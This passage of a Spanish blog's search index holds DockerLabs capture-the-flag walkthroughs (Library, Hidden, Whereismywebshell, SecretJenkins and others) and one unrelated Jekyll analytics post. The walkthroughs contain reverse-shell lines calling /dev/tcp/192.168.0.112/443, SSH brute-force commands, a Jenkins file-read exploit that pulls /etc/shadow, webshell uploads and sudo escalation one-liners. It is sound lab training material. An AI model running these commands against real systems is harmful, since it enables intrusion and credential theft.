usario que nos dio el exploit lanzamos hydra.hydra -l lovely -P ../../../../rockyou.txt ssh://172.17.0.2 -t 4Nos conectamos via ssh con el usuario lovely , buscamos como escalar y encontramos un archivo oculto en opt , no obstante una vez conseguimos el primer user volvi a lanzar hydra contra root y obtuvo su pass.MD5 decryptDescifrando el hash.Podemos ir a la web de crackstation hay varias de este tipo y pasarle el hashComo vemos nos da el mismo pass que hydra.La cuestion es que lo queria descifrar en local y ni con john ni con openssl pude, no se si con openssl estaba haciendo una burrada pero bueno asi aprendemos, no hay perdidas de tiempo solo callejones en los que aprendemos a no  meternos .Busque un script que hace el trabajo.Ahora ya root.Hasta aqui la maquinita con diversos ataques para ek mismo resultado.Comenten si ven algo mal y avisen que es de agradecer.Un saludo y muchas graciasDifundan"
  },
  
  {
    "title": "SecretJenkins , DockerLabs",
    "url": "/posts/secretjenkins/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-10 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada ...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada con python.Herramientas y recursos usados  nmap  Feroxbuster  John the riper  scp  Python Library hijackingEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX SecretJenkinsReporte nmapNmap nos informa que tenemos el 22 abierto y el 8080 corriendo un servidor web con jenkins.Empezmos con jenkins intentando averiguar la version para ver si se puede explotar de algun modo.Lanzo whatwebYa sabemos la version ahora busquemos como explotarla.Explotacion jenkinsexploit CVE-2024-23897chmod +x jenkins_fileread.py./jenkins_fileread.py -u http://$ipvictimaLeemos y nos copiamos a nuestra maquina el contenido de /etc/passw y /etc/shadow.Craking con johnLos unimos haciendo uso de unshadowunshadow passwd shadow &gt; unshadowjohn unshadowInfiltracionTenemos suerte y cuando encuetra la pass de bobby corto el craking y entro con bobby.Nos aprovechamos de python para convertirnos en pinguino.sudo -u pinguinito python -c 'import os; os.system(\"/bin/sh\")'Ya somo el usuario pinguinito ahora toca ser root haber que encontramos.Escalada FinalComo vemos tenemos la misma escalada que en la maquina library.Asi que hacemos lo mismo heber si funciona tambien en esta.Nos creamos un script en python llamado shutil.py y lo añadimos al PATH , despues ejecutamos con sudo.Contenido del scriptimport os os.system(\"/bin/sh\")Directorio de trabajoEjecutamossudo /usr/bin/python3 /opt/script.shHasta aqui la maquinta , pls insert more coinsGracias por leer compartamos conocimiento."
  },
  
  {
    "title": "Library , DockerLabs",
    "url": "/posts/library/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-10 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.Herramientas y recursos usados  nmap  Fer...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.Herramientas y recursos usados  nmap  Feroxbuster  Hydra  PythonEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX libraryReporte nmapNos dice que tenemos el 22 y el 80 primero revisamos la web a ver que encontramos es la de default y no hay nada , mientras revisamos codigo lanzamos feroxbuster.feroxbuster -t 400 -e -x php,txt,html,jpg,json,js -s 200 -u http://172.17.0.2Como podemos ver nos muestra un index php y un direcotorio js.investigamos la web.En index php nos tira un dato y la unica logica que veo es que sea una password y en los directorios no tenemos permisos de escritura.Solo se me ocurre usar hydra y rockyou dado que tambien teniamos el 22  abierto. hydra -L ../../../rockyou.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -t 4InfiltracionCon las credenciales ya podemos probar por ssh con los datos que nos dio hydra.Como siempre ni bien entramos comprobamos lo mas tipico , sudo , find ,script en directorios etc….con sudo -l tenemos suerteVamos a revisar que hace ese script.Como vemos llama a una libreia y esa es la parte que nos interesa.Explotacion y escalada final.Ahora que sabemos lo que hace y usa el script y conocemos como funciona el path, lo unico que tendremos que hacer sera trasladornos a un directorio donde tengamos permisos de escritura.Creamos un archivo con nombre  shutil.py , añadimos esa ruta al PATH y ejecutaremos el script con sudo.El contenido del la libreria que creamos puede variar dependiendo del objetivo que queramos. Lo mas facil para mi seria mandarme una revshell o modificar los permisos de bash con chmod +x y luego ejecutando bash -p  esto es a gusto.Primero creo mi libreria.import osos.system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1'\")Añadimos al PATH la ruta de la libreria nueva.Y por ultimo ejecutamos.Hasta aqui la maquina.Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
  },
  
  {
    "title": "Asucar , DockerLabs",
    "url": "/posts/asucar/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-10 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema , explotacion LFI wordpres ,fuerza bruta ssh y escalada final muy curiosa .Herramientas y recursos ...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema , explotacion LFI wordpres ,fuerza bruta ssh y escalada final muy curiosa .Herramientas y recursos usados  nmap  nslookup  wpscan  puttygenEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV -n -oX asucar 172.17.0.2Reporte nmapNmap nos informa que tenemos el 22 abierto y el 80 corriendo un wordpress en su version 6.5.3.Cuando entro a la web la veo que no carga bien los estilos .nslookup 172.17.0.2Añadimos a /etc/hosts recargamos la web y la revisamos.No soy capaz de encontrar nada util ,en google encuentro esto.Lo cual tampoco sirve pues no esta instalado dicho plugin.Ejecuto wpscanwpscan --api-token xxxxxxxxxxxxxxxxxx --url http://asucar.dl --enumerate u,vpTengo suerte y me halla un local file inclusion.Buscamosen google exploit wordpress site editor lfi y el primer resultado.InfiltracionAjustamos la ruta y probamos.http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwdTenemos exito y ya tenemos usuario es hora de hydra. hydra -l curiosito -P rockyou.txt ssh://172.17.0.2 -t 4Hacemos login y ejecutamos lo de siempre.Me encuentro con un binario con el que nunca he hecho la escalada puttygen a tirar de google para ver como funciona el puttygen.Nos sirve para crear claves ssh , he proabado de distintas formas pero por temas de permisos de escritura no consegui hacerlo como queria , asi que hay que hacerlo primero en el home del usario con el que estamos conectados y luego copiar lo creado con sudo puttygen para poder escribir en el directorio de root.Primero creamos las claves:puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hackedEl siguiente paso es añadir el contenido de la clave publica que extraemos de la privada añadiendolo a authorized_keysputtygen -L ~/.ssh/hacked &gt;&gt; ~/.ssh/authorized_keysYa tenemos todo listo en el directorio del usario pero lo queremos en root , en este momento es cuando realmente abusamos de puttygen usandolo con sudo para copiar a su directorio.Copiamos la clave.sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/hackedAñadimos la clave al authorized_keyssudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/authorized_keys -O public-opensshPor ultimos podemos descargar la clave o conectarnos desde el mismo terminal.ssh -i /home/curiosito/.ssh/hacked root@localhostEsta se me complico buscando info de puttygen mucha mierda de windows me salia.Gracias por leer."
  },
  
  {
    "title": "ChocolateLovers , DockerLabs",
    "url": "/posts/chocoletelovers/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-09 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nma...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nmap  Feroxbuster  Exploit nibbleEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX ChocolateReporte nmapRevisamos la web a ver que encontramos es la de default , mientras le miramos el codigo lanzamos , feroxbuster.Encontramos un comentario que hace alusion a un cms. Modificamos parametros en ferox buster y lo lanzamos a la nueva ruta.feroxbuster -t 400 -e -x php,txt,html,jpg,json,js -s 200 -u http://172.17.0.2/nibbleblogComo podemos ver nos muestra todo lo que hay incluso el login ,vamos al login directos no parece que se hay modificado nada y sea una instalacion totalmente limpia.Estamos de suerte con password por defecto y dentro.Vamos a buscar la version del nibbleblog y buscar en google que se puede hacer.San google.En todo lo que he mirado activan un plugin “my image” despues suben su archivo malicioso , si no he leido mal tambien lo podeis hacer con msfconcole.ExplotacionActivo plugin cargando el fichero.Una vez cargado solo que queda ir a la url correcta.Ahora nos enviamos una revshell , primero nc a la escucha.nc -lnvp 443Y en la webshell.Infiltracion y movimientos lateralesYo en la conexion recibida hacemos un sudo -l .Podemos convertinos en el usario chocolate usando php , para ello hacemos caso a searchbins.Ahora ya como usuario chocolate volvemos a buscar como escalar.Encontramos un script ejecutado por root pero en el que podemos escribir.loverComo yo sigo con mis problemas con las revshells y los editores de texto (todos me dicen unknown terminal).Escalada FinalCreo un archivo con el mismo nombre en mi computador y lo subo a traves de python en atacante y wget en victima , me espero 5 segundos a que se ejecute y bualaaa!!!!  Como revshell utilice la de pentestmonkeySaludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
  },
  
  {
    "title": "Inclusion , DockerLabs",
    "url": "/posts/inclusion/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-08 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  nos encontramos con escaneo de puertos , path traversal , fuerza bruta y escalada final.Herramientas y recursos usados  nmap  Path traversal  hydra  Movimiento lateral  ...",
    "content": "En este reto de DockerLabs  nos encontramos con escaneo de puertos , path traversal , fuerza bruta y escalada final.Herramientas y recursos usados  nmap  Path traversal  hydra  Movimiento lateral  searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX inclusionReporte nmapNmap nos indica que tenemos el 22 y el 80 revisamos la web a ver que encontramos, mientras miramos , lanzamos gosbustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690El output nos dice que encontro el directorio shop asi que a mirar y revisar el codigo , vuelvo a lanzar gobuster contra shop pero no hay nada mas.En la web principal encontramos el siguente error que nos da una pista\"Error de Sistema: ($_GET['archivo']\"); Nos dice que la url espera la carga de un parametro a traves de archivo intentemos leer ficherosTenemos path traversal , intente cargar algunos logs sin exito para convertir el path traversal en un rce a traves de un log poisoning sin exito.Asi que vamos a lo tipico buscar usuarios o passwords para realizar fuerza bruta.InfiltracionPodemos leer passwd y encontramos dos usuarios asi que fuerza bruta.Contra seller se demoraba una eternidad y no es cuestion asi que probe el otro y en 10 segundos la obtuvo .A conectarnos con mancho por ssh.Como vemos no tenemos nada ni con sudo , ni con find , nada en cron ni con ps aux asi que imagino sera como la otra maquina en la que habia que hacer fuerza bruta contra contra el usario localmente y para ello nos traeremos unas pocas cosas hacia la maquina victima.  rockyou  script para hacer fuera bruta “busca el del creador de DockerLabs”  pspy “por paranoia mia no es necesario”Movimiento lateralCon todo en la maquina victima lanzamos el ataque como indica el script.sudo ./Linux-Su-Force.sh usario diccionarioNos pasamos a seller, esto entiendo que seria un movimiento lateral.Ya en seller ejcecutamos lo tipico sudo y demas para intentar averiguar como va la escalada final.Escalada finalSearchbins recomiendo instalarla.Lo que hacemos con este comando en crear una variable llamada cmd que es /bin/sh y con sudo como root decimos que php llame a cmd.Como vemos tenemos php y con searchbins como realizarlo.A convertirnos en root.Saludos y muchas gracias por leer, pueden comentar dudas o comentar como la han resuelto."
  },
  
  {
    "title": "Analytics en chirpy jekyll",
    "url": "/posts/gajekill/",
    "categories": "Software",
    "tags": "analytics, jekyll",
    "date": "2024-05-08 00:00:00 -0300",
    





    
    "snippet": "Aqui vamos a explicar como tengo configurado mi entorno de jekill con el theme chirpy 6.5.5 y google analytics funcionando.Me encontraba el siguiente problema;al tratar de configurarlo todos los ma...",
    "content": "Aqui vamos a explicar como tengo configurado mi entorno de jekill con el theme chirpy 6.5.5 y google analytics funcionando.Me encontraba el siguiente problema;al tratar de configurarlo todos los manuales hablan de añadir al head el trocito de script que te proporciona google pues bien en el directorio de donde hacemos el build no hay layouts ni include en este tema, otros que he probado si los incluyen en el mismo directorio.Para este tema en concreto todo lo que encontre era que tenia que editar el _confyg.yml estableciendo el site verification y id de google analytics.Haciendo solo esas dos ediciones solo me aparecia el site verification cuando consultaba el codigo resultante despues de hacer el build.Esta claro que el error era que no se estaba incluyendo en el head el codigo necesario.Algunos sugieren crear los archivos y los directorios pero si el sitio se construye correctamente y sin errores significa que en algun lugar tienes los archivos.Asi que busquemos con find donde pueden estar, eso dependera de tu config de rubi puede ser en tu usuario o /usr/share/ .Buscamos por el nombre del directorio donde deberian estar los archivos que tenemos que ver y trabajar.find / -type d -name _layouts 2&gt;/dev/nullDirectorio de desarolloDirectorio de instalacion del themeComo podemos ver en la segunda foto tenemos todo y no tenemos necesidad de crear directorios ni archivos , solo editaremos dos archivos el _config.yml y en el caso del tema chirpy si queremos que haga seguimiento de de todo el site el default.hmtlPrimero insertamos los datos en el yml.google_site_verification : Tu codigogoogle_analytics:    id: tu id para la recogida de datos.Luego editamos el archivo default.html qu se ubica en _layouts añadiendo el segundo include que ven en la imagen de abajo.Ahora solo nos queda construir y probar localmente si todo a ido bien.bundle exec jekyll serveSi todo a ido bien nos vamos a la web y buscamos su codigo fuente.Ahora ya esta todo bien de la parte de jekyll si falla algo de la parte de configuracion de analytics"
  },
  
  {
    "title": "Firsthacking , DockerLabs",
    "url": "/posts/firsthacking/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-08 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  nos encontramos con una maquina sumamente facil con escaneo de puertos y explotacion a traves de exploitHerramientas y recursos usados  nmap  searchsploit  msfconsole  p...",
    "content": "En este reto de DockerLabs  nos encontramos con una maquina sumamente facil con escaneo de puertos y explotacion a traves de exploitHerramientas y recursos usados  nmap  searchsploit  msfconsole  pythonEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX firsthackingReporte nmapNmap nos indica que tenemos el 21 que coresponde al servicio ftp fijaos en la version, si solo tenemos ese acceso no hay otra que buscar por ese servicio y con esa version de software.Vamos al grano pq en mi opinion esta deberia ser muy facil o es la resaca de haber intentado hacer la hacktheheaven sin exito.Asi que sin mas ejecutamossearchsploit vsftpdObtenemos lo que esperabaExplotacionCon la info ya conseguida vamos a msfconsole y intducimos lo siguente.search vsftp  use 1show optionsset RHOSTS $ipvictimarunComo veis en la segunda imagen somos root.Con pythonexploitEste exploit necesita de la instalacion de pwntools creo un entrono virtual para no tener mierda por ahi .python3 -m venv vsftpd2.4source  vsftpd2.4/bin/activate pip3 install pwntoolsgit clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.githubcd  vsftpd_2.3.4chomd +x exploit.pypython3 exploit.py $ipvictimaEsta maquina es para aprender a usar google si la comparas con la que nombraba antes que es un infireno para el que esta aprendiendo.En fin hasta la proxima maquina."
  },
  
  {
    "title": "Whereismywebshell , DockerLabs",
    "url": "/posts/whereismywebshell/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-04-30 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nma...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nmap  wfuzzEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX whereisReporte nmapRevisamos la web a ver que encontramos es una web de una academia mientras le miramos el codigo lanzamos gobuster.Vamos directos a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690La salida nos arroja varios archivos prometedores ,el warning y lo que be ser una webshell.Primero miro el warning por si nos dijera algo , no arroja luz de ningun tipo asi que caragmos shell php y vemos una pagina en blanco, en este punto vamos a fuzzear la palabra que nos falta para poder ejecutar comandos remotos.Asi que vamos a fuzzear con wffuz.wfuzz -c --hl=0 -t 200 -w /usr/share/dict/wordlist-probable.txt -u \"http://172.17.0.2/shell.php?FUZZ=id\"Una vez obtenido el parametro pasamos a probar si podemos ejecutar comandos.Resultado positivo , mandemos una rev shell.Ejecutamos lo siguiente pero primero nectact a la escucha.sudo nc -lvnp 443En la webshellbash -c \"bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\"RecepcionEscaladaLo primero una vez reciba la revshell le aplicamos tratamiento.script /dev/null -c bashLa mandamos al background con control-Z.export TERM=xtermexport SHELL=bashSi queremos ajustarla al maximo debemos indicarle el numero de lineas y columnas de nuestra terminal .  Para ver el numero de line y columms de nuestra term ejecutamos respectivamente  echo $LINES y echo $COLUMMS  Ya configurada empezamos a mirar con sudo -l y find.Ninguno nos devuelve nada y ahi recorde que hemos de acostumbrarnos a mirar hacia atras y recordar todo lo que mos hemos ido encontando en la maquina.La memoria me decia que guardaba un secreto en /tmp/ , asi que vamos a mirar que nos dejaron.cd /tmp/ls -laLa puso facil esta vez.su Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
  },
  
  {
    "title": "Summervibes , DockerLabs",
    "url": "/posts/summervibes/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-04-29 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster , explotacion de cve , revshell y escaladaHerramientas y recursos usados  nmap...",
    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster , explotacion de cve , revshell y escaladaHerramientas y recursos usados  nmap  gobuster  hydra  cveEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX summervibes Reporte nmapRevisamos la web a ver que encontramos , buscamos en codigo fuente y encontramos lo siguiente.Asi que vamos a chusmear y de paso lanzamos un gobuster contra ese directorio.Vamos directos a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690Miramos la version del cms , espero no lo hayan editado para despistar.En gobuster tambien vimos un directorio login para el admin , asi que investigamos en la web sobre este cms y como explotarlo.Para poder abusar de este cms si o si y con cualquier cve asociado  necesitamos tener privilegios administrativos.Voy a probar contra admin con rockyou como dic y podemos usar hydra por ejemplo.hydra -l admin -P ~/rockyou.txt 172.17.0.2 http-post-form \"/cmsms/admin/login.php:username=^USER^&amp;password=^PASS^&amp;&amp;loginsubmit=Submit:User name or password incorrect\" -VIExplotacionAhora que tenemos el user y pass vamos a explotar ese cveNos vamos a la pagina de login y nos conectamos.Se nos muestra panel de administracion del cms , como no se como hacerlo paso a buscar como se realiza ese exploit.El que nos interesa es el rec y buscando encuentro.Sigo las instruciones y listo.  Log in as AdministratorAccess the CMS Made Simple admin panel and log in with administrator credentials.Navigate to User Defined TagsGo to Extensions &gt; User Defined Tags.Inject PayloadIn the 'Code' text area, input the following payload:&lt;?php echo system('id'); ?&gt;This PHP code, when executed, will display the system user and group IDs.Execute the PayloadClick on the 'Run' button to execute the payload.Observe the OutputThe output should be similar to:uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)This indicates successful execution of the code, displaying the server process’s user and group IDsDespues de comprobar lo tipico id whoami me dispongo a lanzar una revshel no sin antes dejar netcat a la escucha.InfiltracionYa tenemos la revshell la configuramos y empezamos con lo facil y rapido , ni sudo, ni find nos da resultado , el cms  deberia de tener un bbdd pero no nos la mostro nmap y el cms ha de tener un config asi que buscamos primero el config.Escaladafind / -name config.php 2&gt;/dev/nullBuscamos el servico mysql.ssIntento comprobar tambien con systemctl y ya me huelo medio raroporque me da error.Vamos a intentar conectar a la base de datos con las credenciales de webA mi ya solo se me ocurre hacer fuerza bruta  asi me me dispongo a usar el script que hizo el pinguino.Me copio el script y el diccionario../suforce.sh root rockyou.txt  Le modifique el timeout al script pq no lo pillada hice que fuese mas lento y que mala memoria la mia de no haber probado las contareñas que ya teniamos  Ni con root entre en la bbddSaludos y muchas gracias por leer"
  },
  
  {
    "title": "Hidden , DockerLabs",
    "url": "/posts/hidden-docker/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-04-27 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escal...",
    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escalada final.Herramientas y recursos usados  nmap  gobuster  wfuzzEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto y podemos ver como nos dice que no consigue llegar a hidden.labsudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX hidden_nmap Reporte nmapAntes de poder revisar la web debemos añadir lo que nos dice nmap al fichero hosts , tambiem aprovechamos y lanzamos gobuster por si encuentra algo.nvim /etc/hostsUna vez editado el fichero vamos a trabajar.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://hidden.lab --exclude-length 3690Despues de estar un rato mirando la web que creo que es un bootstrap simplemente y hacerme un lio con el formulario de reserva y la ruta que devolvia desisto y pienso que debe haber algo mas, hemos fuzeado directorios con el comando anterior , hemos  revisado la web un buen rato sin frutos asi que vamos a buscar si tuviera algun host virtual.Como no sabia como excluir los errores en gobuster tiro de wfuzz.wfuzz -c -w /usr/share/dirbuster/directory-list-2.3-medium.txt --hc 400,404,403,302 -H \"Host: FUZZ.hidden.lab\" -u http://hidden.lab -t 100Agregamos de nuevo al fichero hosts el virtualhost que nos da wfuzz y pasamos a ver esa otra web.Nos encontramos una subida de archivos y nos indica que un .php no podemos subir , a buscar extensiones que se ejecuten.Primer intento fallido asi que deduzco que apache debe comprobar que es lo que ejecuta y si no coincide chauuuuDocumentacion phpDespues de probar a subir un .phar lo ha subido sin promblema , averiguamos ahora donde esta asi que otra vez a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://dev.hidden.lab --exclude-length 3690InfiltracionAhora parece estar todo listo el rce y la ruta asi que probamos y acepta comandos a por la revshell.http://dev.hidden.lab/uploads/rce.phar?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.112/443%200%3E%261%22Como vemos en la imagen tenemos varios usuarios despues de buscar scripts , suid , sudo , etc no obtengo nada asi que hay que hacer fuerza bruta , busco un script que hizo el pinguino que era para eso linux brute.Por otro lado no podemos subirnos el rockyou completo asi que lo despiezamos y lo subimos por el webupload.Comando para dividir por numero de lineassplit -l 1000 rockyou.txt parte_Ahora que tenemos todo subido al menos la primera parte del rockyou lanzaremos el script y esperemos que la pass este arriba del fichero si no mi paciencia explota porque va de 1000 en 1000.Nos desplazamos al directorio dnd se han subido los archivos y lo ejecutamos con las 1000 pass primeras../Linux-Su-Force.sh cafetero tudiccionarioEscalada de privilegiosSi os fijais en la imagen de arriba podeis ver la importancia de configurar bien la revshell.Por cierto ataco a cafetero por la relacion clara con la web.Pasamos al user cafetero recordamos que hay varios usarios y se debe tratar de ir de uno a otro hasta root.su cafeteroRevisamos como siempre y las veces que necesitemos por cada usuario permisos , scripts , directorios hasta encontrar algo.Con sudo tenemos suerte.Como vemos podemos ejecutar nano como usuario john.Consultamos gtofbins de ser necesario.sudo -u john nanoRepetimos proceso  este usuario “john” con find , sudo  etc en busca de scripts binarios etc..sudo -l En este caso hacemos uso de apt buscamos en searchbins y adelante.Ahora como usuario bobby repetimos de nuevo el proceso.sudo -lAhora vemos que podemos hacer root con findsudo find . -exec /bin/sh \\; -quitGracias por leer y si alguien que lee esto y sabe porque se me vuelve tan loca la terminal agradeceria ayuda.Saludos"
  },
  
  {
    "title": "walkingcms , DockerLabs",
    "url": "/posts/walkingcms/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-04-26 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema , fuzzing , fuerza bruta y escalada.Herramientas y recursos usados  nmap  feroxbuster  wpscan  searchbinsEnume...",
    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema , fuzzing , fuerza bruta y escalada.Herramientas y recursos usados  nmap  feroxbuster  wpscan  searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto , podemos ver la web mientras hacemos fuzzing de directorios.Reporte nmapferoxbuster -t 200 -x php,txt,html -u http://172.17.0.2 En el root del 80 solo vemos la web por defecpo de apache , pero el feroxbuster nos encuentra que estamos frente a un wordpress.Revisemos mas a fondo ese wordpress lo primero que se me ocurre es el xmlrcp.php , pero vamos de a poco tirando wpscan.Realizamos enumeracion de usuarios y versiones de plugins.wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vpComo vemos tenemos un usuario y nos indica que podemos seguir por el theme una vez hallemos la contraseña para el user mario.Desde este punto nos encontramos con distintas formas de proceder.Una de ellas es con uso de scripts que puedes crear tu mismo o buscar por github , yo me decanto en este punto por msfconsole.ya dentro de msf ejecutamos lo siguiente.search xmlrpcuse 9set PASS_FILE /home/quino/rockyou.txtset USERNAME marioset RHOST http://172.17.0.2set TARGETURI wordpress/xmlrpc.phprunInfiltracionAhora ya con el user y el pass nos vamos al login y empezamos a trabajar el theme susceptible.Vamos a theme editor y buscamos el index , en ese index le colocamos el codigo de una webshell yo tiro con  webshell por probar.Una vez modificado, guardo el index y podemos ir a cargarlo en la web.http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.phpLlegados a este punto nos ponemos a la escucha con nc y nos mandamos una revshell desde la webshell.Recibida la revshell empezamos a averiguar como escalar privilegios, lanzamos sudo , find para empezar.Sudo no esta y con find obtenemos resultados.Tenemos env al lio.Ejecutamos como nos indicaenv /bin/sh -pGracias por leer.Dudas o cuestiones en los comentarios.Saludos"
  },
  
  {
    "title": "Hackpenguin , DockerLabs",
    "url": "/posts/hackpenguin/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-04-26 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos con el tipico escaneo de puertos para buscar una entrada al sistema , fuzzing , steganografiaHerramientas y recursos usados  nmap  gobuster  stegseekEnumeracionEmpezamo...",
    "content": "En este reto nos encontramos con el tipico escaneo de puertos para buscar una entrada al sistema , fuzzing , steganografiaHerramientas y recursos usados  nmap  gobuster  stegseekEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve como puertos abiertos el shh y el http.Reporte nmapMientras revisamos la pagina por default en el 80 , lanzamos gobuster por si encuentra algo.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2 --exclude-length 3690Tenemos suerte con gobuster y nos da penguin.html , revisamos la pagina y no hay nada asi que descargamos la imagen por si esconde algo.Usamos steseekstegseek penguin.jpg ../rockyou.txtComo vemos nos da un passphrase y otro fichero , probamos a abrir el fichero con ese passphrase con resultado negativo.Asi que vamos a por el intento de hashsear el fichero y tirar con johnkeepass2john penguin1.kdbx &gt; penguin.txtUna vez tenemos el hash se lo damos a john.Yo lo ejecuto desde un binario compilado por mi en local../john penguin.txtCon la pass que nos tira john abrimos el kdbx para ver que passwords guarda.InfiltracionRecordamos que tenemos chocolate password1 “que ya la usamos” y la que nos ha dado el fichero.Hora de conectar o intentarlo contra ssh con los datos que tenemos.No tenemos suerte en las primeras pruebas manuales , pruebo con otro user que pienso que puede ser el nombre del archivo kdbx.ssh penguin@172.17.0.2Escalada de privilegiosComo de costumbre y mas rapido primero ejuctamos sudo y find como corresponde y niguno devuelve nada que sirva.Revisamos los directorios donde tenemos acceso y encontramos un script que podria servirnos .Tambien podriamos usar find para buscar scripts que podamos modificar.find / -user root -type f -name *.sh 2&gt;/dev/nullUna vez encontrado el script debemos de ver cuando se ejecuta y si se ejecuta.ps -aux | grep rootVemos que lo esta ejecutando asi que lo vamos a editar solo esta nano en la maquina.  Yo aqui no consegui acabar como root pese a haber seguido al final los writeupsUna vez editado esperemos a que lo ejecute y con el siguiente comando ejecutamos el binario modificado de permisos fraudulentamente.bash -p   Jamas consegui que se ejecutara el script pienso que algo fallo ni idea 